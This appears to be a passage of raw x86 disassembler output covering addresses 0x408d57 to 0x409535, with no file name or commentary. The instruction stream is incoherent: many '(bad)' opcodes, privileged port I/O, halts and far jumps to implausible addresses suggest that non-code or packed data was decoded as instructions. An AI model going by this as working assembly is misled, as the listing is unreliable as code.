  408d57:	mov    dl,BYTE PTR [ebx+ecx*4]
  408d5a:	inc    ebx
  408d5b:	adc    al,0x3
  408d5d:	pop    ecx
  408d5e:	test   dh,bh
  408d60:	jle    0x408d83
  408d62:	adc    al,0xf0
  408d64:	add    eax,0x8f044
  408d69:	imul   esp,DWORD PTR [eax],0xe36c153b
  408d6f:	xchg   edx,eax
  408d70:	outs   dx,BYTE PTR ds:[esi]
  408d71:	push   esi
  408d72:	jb     0x408dbd
  408d74:	test   DWORD PTR [ebp-0x30847901],0x3dbc962
  408d7e:	repnz pop ebp
  408d80:	add    DWORD PTR [esi],eax
  408d82:	js     0x408d3b
  408d84:	in     al,0xc6
  408d86:	add    al,BYTE PTR [edi+0x40f87e58]
  408d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d8d:	mov    ah,BYTE PTR [ebp+0x24e8050a]
  408d93:	pop    ecx
  408d94:	sbb    al,BYTE PTR [ecx+0x5f]
  408d97:	mov    ds:0x984a1a8d,al
  408d9c:	add    al,0x89
  408d9e:	pop    edx
  408d9f:	add    al,0x98
  408da1:	add    eax,eax
  408da3:	mov    ds:0xacb32fa6,eax
  408da8:	dec    esi
  408da9:	adc    DWORD PTR [ecx],ebx
  408dab:	rol    DWORD PTR [esi],0x4c
  408dae:	stos   BYTE PTR es:[edi],al
  408daf:	fcmove st,st(2)
  408db1:	inc    esp
  408db2:	in     eax,dx
  408db3:	or     ecx,DWORD PTR [eax-0x26]
  408db6:	mov    bh,0x6f
  408db8:	fwait
  408db9:	in     al,dx
  408dba:	cmp    esi,DWORD PTR [ebx+eax*1+0x7f]
  408dbe:	aas    
  408dbf:	mov    ebx,DWORD PTR [ebp+eax*1+0x3]
  408dc3:	(bad)  
  408dc5:	jmp    0x408ddc
  408dc7:	adc    DWORD PTR ds:0x14451614,ebx
  408dcd:	push   0x9
  408dcf:	(bad)  
  408dd0:	or     esi,ecx
  408dd2:	mov    ebx,0x7d737670
  408dd7:	add    eax,0xeb01738d
  408ddc:	xchg   edi,eax
  408ddd:	dec    edx
  408dde:	inc    eax
  408ddf:	lock fstp st(2)
  408de2:	mov    DWORD PTR [ebx+eiz*1+0xf],edx
  408de6:	jne    0x408df5
  408de8:	inc    eax
  408de9:	add    DWORD PTR [eax+0x32b0bbe8],eax
  408def:	add    ebp,ebp
  408df1:	mov    esi,ebx
  408df3:	ds jle 0x408e1c
  408df6:	add    al,ah
  408df8:	jle    0x408dba
  408dfa:	mov    DWORD PTR [eax],esi
  408dfc:	mov    bl,BYTE PTR [eax]
  408dfe:	dec    ebp
  408dff:	cmp    DWORD PTR [eax-0x6c],ebp
  408e02:	sbb    eax,0xb68ff763
  408e07:	int    0x1e
  408e09:	aam    0x6d
  408e0b:	repnz xchg edx,eax
  408e0d:	xor    ecx,eax
  408e0f:	sbb    BYTE PTR ds:0xa20b4250,al
  408e15:	cmp    ebx,DWORD PTR [edi-0x7a697e84]
  408e1b:	ins    DWORD PTR es:[edi],dx
  408e1c:	mov    eax,DWORD PTR [esp+ebp*1]
  408e1f:	push   esi
  408e20:	mov    edx,DWORD PTR [eax+0x18]
  408e23:	fs nop
  408e25:	das    
  408e26:	(bad)  
  408e27:	repnz test esi,esi
  408e2a:	mov    BYTE PTR [ebx],0xc1
  408e2d:	(bad)  
  408e2e:	mov    esi,0x676c6340
  408e33:	mov    esi,0x5e06d64d
  408e38:	xor    eax,0x671e3261
  408e3d:	ror    DWORD PTR [esi],cl
  408e3f:	push   edi
  408e40:	jecxz  0x408e73
  408e42:	stc    
  408e43:	xor    BYTE PTR [eax-0x27],ah
  408e46:	sbb    DWORD PTR [eax+0x102069d9],ebp
  408e4c:	xor    DWORD PTR [edi+0x7b],edi
  408e4f:	sub    BYTE PTR [eax+0x74],cl
  408e52:	xor    esp,edx
  408e54:	add    BYTE PTR [esi],al
  408e56:	cmp    bl,bh
  408e58:	xchg   edx,eax
  408e59:	dec    ebp
  408e5a:	pop    ss
  408e5b:	out    0x50,al
  408e5d:	je     0x408e09
  408e5f:	inc    esp
  408e60:	dec    eax
  408e61:	leave  
  408e62:	pusha  
  408e63:	leave  
  408e64:	std    
  408e65:	ret    0x97e
  408e68:	xchg   DWORD PTR ds:0x886d3428,ebx
  408e6e:	into   
  408e6f:	xor    dl,BYTE PTR [edx+0x533ba125]
  408e75:	add    dh,BYTE PTR [ecx]
  408e77:	mov    dh,0x88
  408e79:	(bad)  
  408e7a:	jne    0x408eaa
  408e7c:	pop    es
  408e7d:	push   es
  408e7e:	js     0x408e5f
  408e80:	jo     0x408e48
  408e82:	pop    es
  408e83:	js     0x408e09
  408e85:	sbb    eax,0xf2548d40
  408e8a:	or     BYTE PTR [edx+0x7],dl
  408e8d:	(bad)  
  408e8e:	mov    WORD PTR [edi-0x3d6db7af],es
  408e94:	pop    edx
  408e95:	mov    BYTE PTR [edx+ebp*4+0x256bee40],bh
  408e9c:	push   es
  408e9d:	outs   dx,DWORD PTR ds:[esi]
  408e9e:	add    eax,DWORD PTR [ecx]
  408ea0:	mov    ds:0x6dd09c3d,eax
  408ea5:	(bad)  
  408ea6:	ds dec eax
  408ea8:	and    eax,0x7966c025
  408ead:	enter  0x212b,0x12
  408eb1:	ss pop ebx
  408eb3:	pusha  
  408eb4:	pop    ebp
  408eb5:	ret    
  408eb6:	adc    eax,0x7234814e
  408ebb:	mov    DWORD PTR [esp+ebx*8-0x1c],edi
  408ebf:	add    DWORD PTR [edx-0xfc4bf7b],0xd4281e0
  408ec9:	and    eax,DWORD PTR [edx+0x2a981c03]
  408ecf:	push   eax
  408ed0:	fs dec ebp
  408ed2:	jae    0x408f2c
  408ed4:	dec    esp
  408ed5:	ins    DWORD PTR es:[edi],dx
  408ed6:	add    al,0x3
  408ed8:	inc    ebp
  408ed9:	mov    dh,0x8
  408edb:	mov    DWORD PTR [edx],eax
  408edd:	cmp    ah,ah
  408edf:	jmp    0x8016dcf5
  408ee4:	mov    ds:0x6b5dcf48,al
  408ee9:	jl     0x408f0b
  408eeb:	jno    0x408f10
  408eed:	dec    ebx
  408eee:	push   0x3e097dbb
  408ef3:	jne    0x408efa
  408ef5:	mov    DWORD PTR [ebp+0x29],esi
  408ef8:	or     BYTE PTR [ebx],bh
  408efa:	add    al,0x75
  408efc:	js     0x408eb9
  408efe:	ins    DWORD PTR es:[edi],dx
  408eff:	or     BYTE PTR [eax+0x43],0x4e
  408f03:	and    edi,DWORD PTR [ebp-0x49]
  408f06:	or     eax,0x3d117ef8
  408f0b:	imul   esi,DWORD PTR [ebx+0x2d6d1980],0x9
  408f12:	pusha  
  408f13:	adc    BYTE PTR [eax+0x30c80cde],ah
  408f19:	hlt    
  408f1a:	jl     0x408ea1
  408f1c:	and    cl,cl
  408f1e:	fwait
  408f1f:	push   0x312a346
  408f24:	lea    eax,[ebx+0x10]
  408f27:	or     eax,0x18d260eb
  408f2c:	repz loope 0x408f38
  408f2f:	rcr    BYTE PTR [ebx+0x32],1
  408f32:	popf   
  408f33:	xchg   edx,eax
  408f34:	enter  0xaf13,0x5c
  408f38:	retf   
  408f39:	add    eax,0xd30ea014
  408f3e:	mov    ch,0x44
  408f40:	xor    al,0x5b
  408f42:	push   es
  408f43:	(bad)  [ecx-0x63d34bff]
  408f49:	xchg   ecx,eax
  408f4a:	xchg   esp,eax
  408f4b:	and    edx,DWORD PTR [esi+0x2e]
  408f4e:	mov    ecx,0x289e326b
  408f53:	in     al,0x1
  408f55:	jle    0x408f79
  408f57:	push   esi
  408f58:	ret    0xbd8a
  408f5b:	mov    edx,0x91d349e2
  408f60:	imul   esp,eax,0x435506c0
  408f66:	push   ds
  408f67:	daa    
  408f68:	adc    ecx,DWORD PTR [ecx]
  408f6a:	add    ecx,0x5d
  408f6d:	inc    eax
  408f6e:	addr16 mov eax,0x28394458
  408f74:	sbb    bl,BYTE PTR [edx+0x0]
  408f77:	add    BYTE PTR [esi],ah
  408f79:	(bad)  
  408f7a:	sbb    bl,ch
  408f7c:	retf   
  408f7d:	(bad)  
  408f7e:	or     al,0x86
  408f80:	xor    DWORD PTR [edx+0x59],0x5a
  408f84:	lahf   
  408f85:	pop    ebp
  408f86:	jae    0x408faa
  408f88:	in     al,dx
  408f89:	fs call 0x14f1:0xcc24c30d
  408f91:	cmp    eax,0x26765d3
  408f96:	cmp    edi,edi
  408f98:	hlt    
  408f99:	add    edx,DWORD PTR [ecx-0x7613a7d7]
  408f9f:	pop    ss
  408fa0:	dec    edx
  408fa1:	cld    
  408fa2:	sub    BYTE PTR [edi+0x37],0x92
  408fa6:	pop    ss
  408fa7:	mov    al,BYTE PTR [ebx+0xb75247d]
  408fad:	cmp    DWORD PTR [ebp+0x50],0x589bfba4
  408fb4:	xor    BYTE PTR [edx+0x17],0xeb
  408fb8:	add    bh,BYTE PTR [ebx+edx*1+0x12]
  408fbc:	add    BYTE PTR ds:0x364db754,cl
  408fc2:	jbe    0x408fdf
  408fc4:	adc    bh,BYTE PTR [esi+0x17]
  408fc7:	and    cl,BYTE PTR [eax+0x3]
  408fca:	xchg   BYTE PTR [edi+ebx*4],ah
  408fcd:	sbb    BYTE PTR [edx-0x54],dl
  408fd0:	jle    0x408fc2
  408fd2:	mov    al,ds:0xc15f0059
  408fd7:	pop    ebp
  408fd8:	add    al,0x7b
  408fda:	les    edi,FWORD PTR [ebx]
  408fdc:	inc    ebp
  408fdd:	mov    ebp,0xe005dc0b
  408fe2:	and    eax,0x8c4b7a09
  408fe7:	adc    dh,BYTE PTR [ecx]
  408fe9:	mov    bl,BYTE PTR [edx]
  408feb:	mov    ds:0x486404a3,eax
  408ff0:	repnz fld DWORD PTR [eax-0x6f]
  408ff4:	dec    eax
  408ff5:	xor    al,0xe2
  408ff7:	lock ins BYTE PTR es:[edi],dx
  408ff9:	dec    esp
  408ffa:	adc    bl,BYTE PTR [ecx+eax*4-0x19af9975]
  409001:	add    al,0xd1
  409003:	syscall 
  409005:	jge    0xeb47068
  40900b:	push   edi
  40900c:	mov    ebp,DWORD PTR [ecx]
  40900e:	push   eax
  40900f:	or     DWORD PTR [edi+0xd],0x59
  409013:	add    al,0xda
  409015:	and    ah,al
  409017:	mov    ah,0x8
  409019:	or     DWORD PTR [eax-0x49],esp
  40901c:	adc    DWORD PTR [eax],ecx
  40901e:	pusha  
  40901f:	aam    0xe8
  409021:	or     cl,BYTE PTR ds:0x5e053b
  409027:	xor    al,0x4
  409029:	add    esi,DWORD PTR [ebp+0x78]
  40902c:	mov    dh,0xc6
  40902e:	mov    ebx,0xb01e888
  409033:	fs pop ecx
  409035:	sbb    eax,0x6d6403f1
  40903a:	and    eax,esi
  40903c:	cmp    ch,al
  40903e:	push   ss
  40903f:	cmp    eax,DWORD PTR ds:0xc4ba9019
  409045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409046:	je     0x408fe1
  409048:	push   edx
  409049:	(bad)  
  40904a:	push   ebp
  40904b:	out    0xc7,al
  40904d:	dec    ecx
  40904e:	sbb    al,0x8
  409050:	aad    0x97
  409052:	clc    
  409053:	jmp    0x84eb6343
  409058:	sub    ch,BYTE PTR [eax+0x1197cb8a]
  40905e:	push   cs
  40905f:	xor    BYTE PTR [esp+edx*1],bh
  409062:	cdq    
  409063:	pop    es
  409064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409065:	adc    eax,0x146063c
  40906a:	push   edi
  40906b:	xchg   esp,eax
  40906c:	mov    ds:0x904909a2,eax
  409071:	adc    dh,BYTE PTR [eax+0x2ecbcf01]
  409077:	push   esi
  409078:	adc    BYTE PTR [edx-0x4c],ch
  40907b:	in     al,0xc8
  40907d:	mov    cl,0x59
  40907f:	inc    edi
  409080:	push   0x4ac010e5
  409085:	test   al,0x9a
  409087:	mov    ebx,0x3d542428
  40908c:	sbb    ecx,ebx
  40908e:	mov    DWORD PTR [edi+0x4],esi
  409091:	ins    DWORD PTR es:[edi],dx
  409092:	mov    dh,dh
  409094:	xchg   DWORD PTR [edx],ecx
  409096:	sub    DWORD PTR [edx+0x10],esp
  409099:	cmp    eax,0xffffffde
  40909c:	pusha  
  40909d:	enter  0x2d61,0xb9
  4090a1:	(bad)  
  4090a3:	push   es
  4090a4:	jnp    0x4090e6
  4090a6:	mov    ds:0x7fe283a3,al
  4090ab:	push   ds
  4090ac:	push   0xc0d989dc
  4090b1:	sar    BYTE PTR [esi-0x3c6a88b9],0xd0
  4090b8:	mov    al,ds:0x66164c6a
  4090bd:	ret    
  4090be:	or     BYTE PTR [eax-0x66],dh
  4090c1:	(bad)  
  4090c2:	aas    
  4090c3:	jmp    0x8c736112
  4090c8:	jmp    0x40908d
  4090ca:	dec    ebx
  4090cb:	test   al,0x20
  4090cd:	push   ebp
  4090ce:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090d0:	pop    esp
  4090d1:	push   ebx
  4090d2:	mov    al,ds:0x32ca69c6
  4090d7:	data16 loop 0x409102
  4090da:	imul   eax,DWORD PTR [ecx+edx*2-0x1bf25731],0x724ded1d
  4090e5:	push   ss
  4090e6:	aad    0xa3
  4090e8:	(bad)  
  4090ea:	sbb    al,0x8
  4090ec:	shl    DWORD PTR [edx+0x6fe4e802],0xf1
  4090f3:	in     al,0x87
  4090f5:	stos   BYTE PTR es:[edi],al
  4090f6:	lock mov edi,DWORD PTR [edx+0x110f017b]
  4090fd:	xlat   BYTE PTR ds:[ebx]
  4090fe:	inc    ecx
  4090ff:	mov    al,0xe1
  409101:	add    esp,0xc6a66975
  409107:	loopne 0x4090be
  409109:	je     0x40909b
  40910b:	mov    dh,0x6
  40910d:	enter  0xcc4,0xdc
  409111:	loop   0x409117
  409113:	add    DWORD PTR [edx-0x529bbe94],esp
  409119:	outs   dx,DWORD PTR ds:[esi]
  40911a:	hlt    
  40911b:	mov    ds:0x4863073a,al
  409120:	lds    eax,FWORD PTR [edi+0x28]
  409123:	loopne 0x409169
  409125:	jle    0x40915a
  409127:	mov    bl,BYTE PTR [ebx+ecx*1+0x692aa046]
  40912e:	or     eax,DWORD PTR [edx+edx*4+0x23]
  409132:	addr16 push ecx
  409134:	je     0x40917e
  409136:	jecxz  0x4090e4
  409138:	and    al,0x3f
  40913a:	push   ebx
  40913b:	je     0x409128
  40913d:	arpl   WORD PTR [ecx],ax
  40913f:	push   0x990b8c61
  409144:	cmp    edi,DWORD PTR fs:[ebp+0x48]
  409148:	fs loopne 0x40912b
  40914b:	inc    ebp
  40914c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40914d:	fs nop
  40914f:	(bad)  
  409151:	inc    esi
  409152:	js     0x409104
  409154:	jne    0x409181
  409156:	stc    
  409157:	ftst   
  409159:	or     ch,ah
  40915b:	sbb    BYTE PTR [ecx],ch
  40915d:	fdiv   QWORD PTR [edx]
  40915f:	adc    BYTE PTR [esp+edx*1+0x8a8346e],0x10
  409167:	add    al,0x6c
  409169:	push   0xff4241a0
  40916e:	sahf   
  40916f:	mov    ch,0x5
  409171:	inc    esp
  409172:	sub    DWORD PTR [edx+edi*2+0x5004a01e],ecx
  409179:	or     al,0x6
  40917b:	add    cl,bh
  40917d:	or     DWORD PTR ds:0xbb4f100b,ebp
  409183:	pop    esp
  409184:	jp     0x40910c
  409186:	mov    eax,ds:0xea3c7291
  40918b:	or     esp,DWORD PTR [ebx+0x1635d7a2]
  409191:	xor    al,cl
  409193:	adc    BYTE PTR [ebx],cl
  409195:	pop    edi
  409196:	stos   BYTE PTR es:[edi],al
  409197:	inc    esp
  409198:	xchg   ecx,eax
  409199:	or     ebx,DWORD PTR [eax+0x6a9f811]
  40919f:	mov    BYTE PTR [edx+0x828fe7a],bl
  4091a5:	pop    ebp
  4091a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091a7:	dec    edx
  4091a8:	movzx  esp,BYTE PTR ds:0x10f6f80d
  4091af:	int3   
  4091b0:	add    BYTE PTR [esi+0x27],ah
  4091b3:	add    DWORD PTR [eax+0x10],esi
  4091b6:	sub    eax,0x74464d80
  4091bb:	daa    
  4091bc:	xchg   ebp,eax
  4091bd:	mov    esp,0xd465c1fc
  4091c2:	in     al,dx
  4091c3:	adc    BYTE PTR [edx],dl
  4091c5:	jae    0x4091ae
  4091c7:	out    dx,al
  4091c8:	fs dec ebx
  4091ca:	add    ah,BYTE PTR [esi]
  4091cc:	push   ebp
  4091cd:	shl    DWORD PTR [esi-0x13fe6f47],cl
  4091d3:	je     0x409240
  4091d5:	mov    ds:0x4ac02993,al
  4091da:	cmp    ebp,DWORD PTR [edx*1-0x6fd27864]
  4091e1:	add    edi,DWORD PTR [ecx+0xcf49ad7]
  4091e7:	cmp    dl,BYTE PTR [edi+edi*1]
  4091ea:	xor    esp,esp
  4091ec:	mov    eax,0x9615d826
  4091f1:	fimul  DWORD PTR [edx+0x2f]
  4091f4:	inc    edi
  4091f5:	mov    al,ds:0xd23e260
  4091fa:	stos   DWORD PTR es:[edi],eax
  4091fb:	pushf  
  4091fc:	outs   dx,DWORD PTR ds:[esi]
  4091fd:	pop    es
  4091fe:	adc    edi,DWORD PTR [edx+edi*1-0x28]
  409202:	mov    cl,0xbe
  409204:	arpl   WORD PTR [edi],si
  409206:	addr16 dec esi
  409208:	adc    BYTE PTR ds:0xb4218c14,cl
  40920e:	pop    es
  40920f:	xchg   BYTE PTR [eax+0x208e17b1],ch
  409215:	test   dh,dh
  409217:	outs   dx,DWORD PTR ds:[esi]
  409218:	cdq    
  409219:	adc    DWORD PTR [edx+0x9],0xab0e13eb
  409220:	mov    BYTE PTR [edi+0x14],dl
  409223:	jae    0x4091f2
  409225:	call   0xebc6:0x89bfdbe0
  40922c:	mov    ecx,DWORD PTR ss:[esi+0x14]
  409230:	sub    eax,DWORD PTR [edi+esi*2+0xa]
  409234:	mov    eax,esi
  409236:	fwait
  409237:	push   esp
  409238:	and    ebp,DWORD PTR [eax-0x8]
  40923b:	out    dx,eax
  40923c:	push   cs
  40923d:	cmp    ecx,ebx
  40923f:	jb     0x409243
  409241:	mov    ecx,ebx
  409243:	push   esi
  409244:	sub    ebx,ecx
  409246:	jno    0x40924b
  409248:	ficomp DWORD PTR [ebx+0x45]
  40924b:	fcomp  QWORD PTR [edx+0x1d]
  40924e:	daa    
  40924f:	mov    edx,ecx
  409251:	in     al,0xfc
  409253:	cli    
  409254:	iret   
  409255:	push   esi
  409256:	adc    ebp,esp
  409258:	rcr    DWORD PTR [esi+0x9],1
  40925b:	(bad)  [ebp-0x3a]
  40925e:	pop    ebx
  40925f:	sbb    ebp,DWORD PTR [edx-0x27305fbd]
  409265:	cmovnp ecx,DWORD PTR [esi*1-0x2fb3d6ef]
  40926d:	inc    ebx
  40926e:	pusha  
  40926f:	adc    al,0xec
  409271:	add    al,0x1a
  409273:	adc    BYTE PTR [edi],bl
  409275:	or     BYTE PTR [ebx+edx*8],cl
  409278:	sub    eax,0xf1a54f46
  40927d:	adc    BYTE PTR [edi+0x1a],al
  409280:	push   ecx
  409281:	mov    esp,0xc0b67d57
  409286:	sub    DWORD PTR [edi],eax
  409288:	inc    ebp
  409289:	add    BYTE PTR [edx+0x8],ah
  40928c:	out    0xee,eax
  40928e:	adc    DWORD PTR ds:0x11b2f819,ebx
  409294:	or     BYTE PTR [edx],dh
  409296:	out    0xc6,eax
  409298:	fistp  DWORD PTR ss:[esi]
  40929b:	or     BYTE PTR [ebx],0x58
  40929e:	xor    ah,BYTE PTR [ebx-0x30]
  4092a1:	push   ss
  4092a2:	and    cl,BYTE PTR [eax+0x18]
  4092a5:	jno    0x40930f
  4092a7:	hlt    
  4092a8:	ja     0x4092b5
  4092aa:	inc    esi
  4092ab:	cmp    al,0x24
  4092ad:	dec    ebp
  4092ae:	adc    cl,BYTE PTR [ebp+0x37a86260]
  4092b4:	add    bh,al
  4092b6:	clc    
  4092b7:	sub    al,0x12
  4092b9:	outs   dx,BYTE PTR ds:[esi]
  4092ba:	add    dh,BYTE PTR [ebp+0x16]
  4092bd:	adc    BYTE PTR [edi],0xdb
  4092c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c1:	pusha  
  4092c2:	push   ds
  4092c3:	cwde   
  4092c4:	cmp    ah,cl
  4092c6:	add    ebp,DWORD PTR [eax+0x2c]
  4092c9:	shr    bl,0x4
  4092cc:	cld    
  4092cd:	sub    DWORD PTR [ebx-0x3f],ebp
  4092d0:	fld    QWORD PTR [edi]
  4092d2:	sub    al,0x6
  4092d4:	je     0x4092dc
  4092d6:	add    edx,DWORD PTR [ebx]
  4092d8:	jmp    0x4092fc
  4092da:	sbb    al,0x8f
  4092dc:	xor    BYTE PTR [eax],ah
  4092de:	fild   WORD PTR [ebx]
  4092e0:	jmp    0x4092f8
  4092e2:	adc    BYTE PTR [eax*1-0x75f56cef],al
  4092e9:	jl     0x4092b0
  4092eb:	xor    DWORD PTR [ebx+0x45],edi
  4092ee:	adc    esi,ebx
  4092f0:	push   ss
  4092f1:	or     eax,0x391900bd
  4092f6:	sbb    DWORD PTR [edi-0x62cc6bee],eax
  4092fc:	mov    al,0xe0
  4092fe:	inc    esp
  4092ff:	mov    edi,0x98731307
  409304:	cmp    eax,0x6b985cd
  409309:	push   es
  40930a:	hlt    
  40930b:	pop    edx
  40930c:	popa   
  40930d:	daa    
  40930e:	push   esp
  40930f:	xchg   DWORD PTR [ebx-0x4f46882b],eax
  409315:	nop
  409316:	jge    0x40934b
  409318:	adc    al,BYTE PTR [edx]
  40931a:	je     0x409347
  40931c:	jmp    0x40937a
  40931e:	test   al,0xa1
  409320:	fldenv [eax+0x6e]
  409323:	div    DWORD PTR ds:0xc9039f78
  409329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40932a:	sar    BYTE PTR [eax],0x28
  40932d:	cdq    
  40932e:	and    DWORD PTR [ecx+0x1ecba70b],ebx
  409334:	int3   
  409335:	adc    ah,ch
  409337:	ja     0x409361
  409339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933a:	rol    DWORD PTR [esi+0x20],0xf3
  40933e:	adc    al,BYTE PTR [ecx+edi*2]
  409341:	dec    ecx
  409342:	dec    eax
  409343:	adc    edi,DWORD PTR [edx-0x2a]
  409346:	xor    BYTE PTR [eax+0x12],0x17
  40934a:	call   0x8715e498
  40934f:	adc    BYTE PTR [esi-0x5775b73a],ah
  409355:	pop    esi
  409357:	xchg   esi,eax
  409358:	push   eax
  409359:	leave  
  40935a:	lock add eax,0xc0d1a06f
  409360:	or     bl,BYTE PTR [ebp+0x4564f2f9]
  409366:	mov    bl,0x60
  409368:	fs push ebx
  40936b:	and    ch,BYTE PTR ds:0x834b7f50
  409371:	ret    
  409372:	cld    
  409373:	imul   eax,DWORD PTR [ebx],0xf
  409376:	and    ebx,esi
  409378:	inc    edi
  409379:	les    eax,FWORD PTR [esi]
  40937b:	xchg   esp,eax
  40937c:	out    dx,al
  40937d:	or     dh,BYTE PTR [esi-0xf]
  409380:	fcomp  QWORD PTR [eax]
  409382:	push   esp
  409383:	adc    DWORD PTR [ecx+0x6e],0x60
  409387:	in     al,dx
  409388:	outs   dx,BYTE PTR ds:[esi]
  409389:	mul    BYTE PTR [edx-0x6a]
  40938c:	pause  
  40938e:	out    dx,al
  40938f:	imul   edx,ebx
  409392:	adc    eax,0xddb23b3f
  409397:	adc    BYTE PTR [esi],dl
  409399:	jo     0x4093f2
  40939b:	cmp    edx,DWORD PTR [eax-0x8]
  40939e:	add    al,0xfe
  4093a0:	sub    al,0x8b
  4093a2:	cmp    eax,0x7303d968
  4093a7:	fs push es
  4093a9:	xor    BYTE PTR [ecx-0x47],bh
  4093ac:	ins    BYTE PTR es:[edi],dx
  4093ad:	and    eax,0x8b281607
  4093b2:	mov    edx,0x91c3416
  4093b7:	scas   eax,DWORD PTR es:[edi]
  4093b8:	aad    0xdd
  4093ba:	or     al,0x4b
  4093bc:	mov    BYTE PTR [ebx],al
  4093be:	push   ss
  4093bf:	pop    ds
  4093c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c1:	leave  
  4093c2:	cmp    al,0x0
  4093c4:	mov    ah,0x80
  4093c6:	pop    ebx
  4093c7:	lea    ecx,[ecx+0x34]
  4093ca:	mov    bh,0x6e
  4093cc:	fwait
  4093cd:	jb     0x409396
  4093cf:	and    al,0x9
  4093d1:	add    edx,DWORD PTR ds:0x349e2c20
  4093d7:	dec    ebp
  4093d8:	sar    DWORD PTR [esi],cl
  4093da:	push   eax
  4093db:	bound  esi,QWORD PTR [esi+edx*1+0x9]
  4093df:	or     eax,0x154f34d6
  4093e4:	test   BYTE PTR [edx-0x2c55f064],dl
  4093ea:	xor    al,0x4d
  4093ec:	rol    DWORD PTR [ebx],cl
  4093ee:	mov    bl,0xc2
  4093f0:	shl    eax,1
  4093f2:	out    dx,al
  4093f3:	inc    ecx
  4093f4:	mov    cl,0xdf
  4093f6:	outs   dx,BYTE PTR ds:[esi]
  4093f7:	std    
  4093f8:	jmp    0x719599b3
  4093fd:	fcomp  DWORD PTR [ecx+0xb]
  409400:	xchg   esp,eax
  409401:	pushf  
  409402:	dec    ebp
  409403:	cwde   
  409404:	fmul   QWORD PTR [ecx]
  409406:	adc    DWORD PTR [edx],eax
  409408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409409:	xchg   ecx,eax
  40940a:	dec    esp
  40940b:	leave  
  40940c:	add    al,0xa
  40940e:	xor    DWORD PTR gs:[eax+0x66],0x78
  409413:	bswap  edx
  409415:	arpl   WORD PTR [eax+0x7b09142e],di
  40941b:	mov    al,0xc6
  40941d:	add    BYTE PTR [ecx-0x4d],bl
  409420:	in     eax,0x90
  409422:	jmp    0x409491
  409424:	pop    ss
  409425:	sti    
  409426:	test   BYTE PTR ds:0x8555fdf,ch
  40942c:	xor    BYTE PTR [esi+0x62],dl
  40942f:	jmp    0x409478
  409431:	mov    edx,0xbb640e08
  409436:	nop
  409437:	add    edi,DWORD PTR [eax]
  409439:	sub    DWORD PTR [ebx+0x2],eax
  40943c:	xor    DWORD PTR [eax+0x1c1bbb0b],esi
  409442:	or     al,0x60
  409444:	dec    esi
  409445:	and    DWORD PTR [ecx+0x19],edi
  409448:	adc    BYTE PTR [esi],0x26
  40944b:	(bad)  
  40944c:	mov    esp,0x97323c91
  409451:	push   ss
  409452:	imul   eax,DWORD PTR [esi],0x33038c03
  409458:	dec    BYTE PTR [ecx+0x70]
  40945b:	cwde   
  40945c:	adc    al,0xa4
  40945e:	add    cl,BYTE PTR [edx-0x32]
  409461:	aam    0xe9
  409463:	out    0xa0,al
  409465:	ds into 
  409467:	jle    0x409498
  409469:	mov    dh,0x86
  40946b:	jle    0x409483
  40946d:	or     bh,ah
  40946f:	jbe    0x40940d
  409471:	sahf   
  409472:	or     BYTE PTR [ebp+0x15eb817b],bh
  409478:	jmp    0x409487
  40947a:	mov    esi,0xeca8759d
  40947f:	xor    eax,0xd17f2edb
  409484:	add    esp,0x75c079a6
  40948a:	fld    TBYTE PTR [edi-0x47f382a]
  409490:	mov    bl,dh
  409492:	dec    edi
  409493:	or     al,0x2b
  409495:	dec    edi
  409496:	leave  
  409497:	add    al,0xe
  409499:	mov    dl,0x2c
  40949b:	retf   
  40949c:	lahf   
  40949d:	scas   eax,DWORD PTR es:[edi]
  40949e:	sub    ebx,ecx
  4094a0:	push   edi
  4094a1:	mov    eax,DWORD PTR [edi+0x47]
  4094a4:	dec    edi
  4094a5:	mov    DWORD PTR [ecx+0x60],0xae5f4320
  4094ac:	pushaw 
  4094ae:	push   esi
  4094af:	cwde   
  4094b0:	adc    ch,bl
  4094b2:	mov    fs,WORD PTR [ebx+0x14]
  4094b5:	out    dx,eax
  4094b6:	sbb    al,0x81
  4094b8:	mov    ebx,DWORD PTR [eax]
  4094ba:	sbb    BYTE PTR [edi],al
  4094bc:	std    
  4094bd:	or     al,0x58
  4094bf:	push   esi
  4094c0:	out    dx,eax
  4094c1:	mov    ?,WORD PTR [ecx]
  4094c3:	sbb    BYTE PTR [edi+ebp*1-0x80],dh
  4094c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c8:	pusha  
  4094c9:	push   esp
  4094ca:	jmp    0x40948a
  4094cc:	mov    dl,0x3b
  4094ce:	pop    ecx
  4094cf:	cs (bad) 
  4094d1:	cdq    
  4094d2:	sub    bl,cl
  4094d4:	cmp    DWORD PTR [esi],edx
  4094d6:	mov    eax,0x733d5429
  4094db:	inc    ecx
  4094dc:	xchg   esp,eax
  4094dd:	or     ebp,ebx
  4094df:	dec    edi
  4094e0:	scas   al,BYTE PTR es:[edi]
  4094e1:	inc    ecx
  4094e2:	aam    0x24
  4094e4:	out    dx,al
  4094e5:	sub    DWORD PTR [ecx+0x5c97ec25],0xb2197ff6
  4094ef:	push   es
  4094f0:	aaa    
  4094f1:	add    ebx,ebp
  4094f3:	pop    ss
  4094f4:	mov    dl,0xc
  4094f6:	push   eax
  4094f7:	push   ds
  4094f8:	aad    0x92
  4094fa:	or     edx,esi
  4094fc:	add    ecx,DWORD PTR [eax]
  4094fe:	shl    BYTE PTR [ebx],0x81
  409501:	das    
  409502:	sbb    BYTE PTR ds:0xbc423a3c,cl
  409508:	dec    esi
  409509:	inc    esi
  40950a:	les    esi,FWORD PTR [eax+0x352c1788]
  409510:	test   BYTE PTR [esp+eax*1+0x511418bb],bh
  409517:	mov    ds,ecx
  409519:	int3   
  40951a:	add    al,0xf0
  40951c:	(bad)
  409520:	out    dx,eax
  409521:	je     0x409573
  409523:	mov    esi,0x34603a60
  409528:	push   ecx
  409529:	xchg   ebx,eax
  40952a:	or     eax,0x481eff6e
  40952f:	xor    eax,0x2858ea0b
  409534:	dec    eax
  409535:	add    al,dh
